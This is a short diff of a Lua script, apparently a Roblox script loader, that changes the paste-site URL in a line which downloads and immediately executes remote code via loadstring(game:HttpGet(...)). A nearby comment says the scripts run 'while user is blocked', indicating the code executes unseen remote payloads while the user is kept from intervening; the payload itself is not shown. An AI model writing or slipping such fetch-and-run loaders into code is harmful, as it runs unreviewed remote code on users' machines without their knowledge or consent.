@@ -62,7 +62,7 @@ label.Text = "Executing scripts..."
 
 --// Immediately run your scripts while user is blocked
 pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/IZm17Kpn/raw"))()
 end)
 
 pcall(function()
